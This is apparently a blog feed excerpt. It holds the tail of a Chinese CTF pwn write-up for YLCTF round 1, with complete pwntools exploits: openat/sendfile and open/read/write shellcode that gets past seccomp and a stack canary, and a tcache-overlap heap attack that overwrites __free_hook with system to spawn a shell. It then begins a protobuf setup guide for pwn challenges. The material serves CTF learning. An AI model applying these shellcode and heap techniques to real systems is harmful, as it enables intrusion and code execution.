0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁用了普通的orw，那就用openat+sendfile的方案。零拷贝是真的好用，要是不强制使用read和write，现在基本都用sendfile。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;challenge.yuanloo.com&quot;</span>, <span class="number">34957</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./ezorw&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    push SYS_openat</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, 3</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x100</span></span><br><span class="line"><span class="string">    push SYS_sendfile</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(sc)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;orw~&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x04-canary-orw"><a href="#0x04-canary-orw" class="headerlink" title="0x04 canary_orw"></a>0x04 canary_orw</h2><p>gadget+shellcode。不知道我是不是把题目非预期了，给了个vuln函数是一点没用上。程序一来就直接可以往main的返回地址写东西，允许写最大21个字节。给了个canary形同虚设，NX也没开，所以直接往栈上写shellcode就完事了。</p><p>先利用jmp rsp执行一个read函数，因为字节数不够写，所以先不改rdx，还是写21字节，然后把一个可以读取更多字节数的read的shellcode写进去，再把orw的shellcode写进去就行。注意rsp会往下推，每次shellcode前面都要加上一定的padding就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./canary&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="number">38925</span>)</span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x400820</span></span><br><span class="line">jmp_rsp = <span class="number">0x40081B</span></span><br><span class="line"></span><br><span class="line">payload = p64(jmp_rsp) + \</span><br><span class="line">    asm(<span class="string">&quot;xor eax, eax; mov rsi,rsp; mov edi,0; syscall&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+asm(<span class="string">&quot;xor eax,eax;mov edx,0x100;syscall&quot;</span>))</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    push SYS_open</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* read size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_read</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0xFF   /* write size */</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push SYS_write</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x15</span>+asm(sc))</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-ezheap"><a href="#0x05-ezheap" class="headerlink" title="0x05 ezheap"></a>0x05 ezheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>劫持tcache管理堆。最多只能申请32个次，delete没有UAF，也没有堆溢出。但是edit函数非常地奇怪。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_chunk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *buf; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;one chance for you&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">  *buf = <span class="number">666666</span>;</span><br><span class="line">  ++a;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一次机会可以往任意地址写一个666666（bytes类型）。注意*buf的类型是DWORD，所以实际上是写入0x00A2C2A。重点在于可以利用写进去的00，如果精心构造，可以利用这个00劫持tcache管理堆，造成堆叠。也就是同一个堆地址会进入到两条大小不同的tcachebin当中。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>前置脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice\n&quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Size :\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Content :\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;content :\n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>先泄露地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)  <span class="comment"># 从unsorted切割</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1EC061</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 0xb0 4-&gt;3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 5   原4 tcache</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x361</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><p>其实这里已经有为了后面的堆风水进行构造了。chunk4的地址是0x*400，最后一个字节刚好是00。为了防止unsortedbin切割都后面堆叠造成影响，我们需要先申请足够多的chunk，使unsortedchunk进入到smallbin中。然后把chunk5再次释放，使其先进入到tcache中，方便后面进行内容修改。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 8 把unsortedchunk取到后面不够取，进到smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment"># 0xb0 5-&gt;3 or 4-&gt;3</span></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># 0x110 6</span></span><br></pre></td></tr></table></figure><p>然后最重要的一步来了。现在堆长这样。</p><p><img src="https://c-lby.top/images/2024YLCTF-1/edit%E5%89%8D%E5%A0%86.png" alt="edit前堆"></p><p>红色框是0xb0大小chunk的头，蓝色框是0x110的。如果我在heap_base+0x105的地方开edit，那么00就会被写到蓝色框的低一位字节。这样一来，我一申请0x110，就能申请到0x*400的堆，我申请0xb0也是一样的。那这就达到了堆叠的效果。后面先申请0x110然后修改fd位为free_hook，再申请两个0xb0的堆，就能达到free_hook，修改为ogg或者system即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base+<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, p64(free_hook))  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0xa0</span>, p64(system))  <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice\n&quot;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Size :\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Content :\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;content :\n&quot;</span>, addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Index :\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)  <span class="comment"># 从unsorted切割</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1EC061</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># 0xb0 4-&gt;3</span></span><br><span class="line">add(<span class="number">0xa0</span>)  <span class="comment"># 5   原4 tcache</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x361</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment"># 8 把unsortedchunk取到后面不够取，进到smallbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment"># 0xb0 5-&gt;3 or 4-&gt;3</span></span><br><span class="line">delete(<span class="number">6</span>)  <span class="comment"># 0x110 6</span></span><br><span class="line">edit(p64(heap_base+<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x100</span>, p64(free_hook))  <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>)  <span class="comment"># 10</span></span><br><span class="line">add(<span class="number">0xa0</span>, p64(system))  <span class="comment"># 11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x06-msg-bot"><a href="#0x06-msg-bot" class="headerlink" title="0x06 msg_bot"></a>0x06 msg_bot</h2><p>protobuf+shellcode过滤。另起一篇<a href="https://c-lby.top/2024/10/12/YLCTF-msgbot-protobuf/">文章</a>细讲。</p>]]></content>
    
    
    <summary type="html">ROUND1</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>protobuf pwn题环境配置及基础操作</title>
    <link href="https://c-lby.top/2024/protobuf-install/"/>
    <id>https://c-lby.top/2024/protobuf-install/</id>
    <published>2024-10-11T15:17:23.000Z</published>
    <updated>2024-11-08T03:01:28.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-配置环境"><a href="#0x00-配置环境" class="headerlink" title="0x00 配置环境"></a>0x00 配置环境</h2><p>VMware Ubuntu22.04<br>VMware Ubuntu20.04<br>WSL2 Ubuntu22.04均按照步骤配置环境没有问题</p><p>windows环境没有测试</p><p>关于protobuf，网上有很多介绍，不多赘述。</p><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><h3 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h3><p>请确保环境安装了make并且能正常使用，因为项目需要自己编译。</p><p>Ubuntu22是默认自带较高版本的protobuf的，如果你不打算两个版本同时存在在电脑上的话，可以选择卸载。（两个版本一起也能用，但比较麻烦，我没研究）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> protoc</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">protoc: /usr/bin/protoc（虽然不知道为什么我的实在anaconda下）</span></span><br><span class="line">rm -rf /usr/bin/protoc #这里的路径是上面显示的路径</span><br><span class="line"></span><br><span class="line">sudo rm -rf /usr/include/google/protobuf #头文件</span><br><span class="line">sudo rm -rf /usr/local/include/google/protobuf #头文件</span><br><span class="line">sudo rm -rf /usr/lib/libproto* #库文件</span><br><span class="line">sudo rm -rf /usr/local/lib/libproto* # 库文件</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/h799710/article/details/126762153">来源</a></p><h3 id="编译安装protoc库"><a href="#编译安装protoc库" class="headerlink" title="编译安装protoc库"></a>编译安装protoc库</h3><p>（protoc是protobuf的库，不是protobuf-c的，请注意区分）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-all-3.6.1.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvzf protobuf-all-3.6.1.tar.gz</span></span><br></pre></td></tr></table></figure><p>也可以在浏览器中下载后手动解压。这里下载的版本比较旧了，是为了适配后面要安装的protobuf-c，如果不需要，也可以下载最新版（但是一般做pwn题目前大多都还是C语言写的）。如果只需要C不需要其他语言的，也可以下载只有<a href="https://github.com/protocolbuffers/protobuf/releases/download/v3.6.1/protobuf-cpp-3.6.1.tar.gz">cpp版本</a>的，可以减小体积和加快编译（但不多）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> protobuf-all-3.6.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure &amp;&amp; make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure><p>其实上面三步建议分开，要是哪一步出问题了还可以去查一查。在install之前可以运行<code>make check</code>检查一下。make需要花点时间，取决于你的电脑性能。编译完之后运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/local/lib/libprotobuf.so.17 /usr/lib/libprotobuf.so.17</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ln</span> -s /usr/local/lib/libprotoc.so.17 /usr/lib/libprotoc.so.17</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo ldconfig</span></span><br></pre></td></tr></table></figure><p>这时候输入<code>protoc --version</code>应该就会回显<code>libprotoc 3.6.1</code>，如果回显3.20.x，说明是Ubuntu22原本自带的版本没删干净。</p><h3 id="编译安装protobuf-c"><a href="#编译安装protobuf-c" class="headerlink" title="编译安装protobuf-c"></a>编译安装protobuf-c</h3><p>protobuf原生并不支持C，这里用一个第三方库来兼容C语言。编译步骤和上面一样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wget https://github.com/protobuf-c/protobuf-c/releases/download/v1.5.0/protobuf-c-1.5.0.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xvzf protobuf-c-1.5.0.tar.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> protobuf-c-1.5.0</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./configure &amp;&amp; make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure><p>顺带一提，如果上面protobuf安装的版本过高，那么在configure的时候会提示没找到protobuf。</p><h3 id="安装python第三方库"><a href="#安装python第三方库" class="headerlink" title="安装python第三方库"></a>安装python第三方库</h3><p>写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。不用像网上把整个google库都下下来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip3 install protobuf==3.20.3</span></span><br></pre></td></tr></table></figure><p>这里protobuf的版本要用到3.20.x（只有1 2 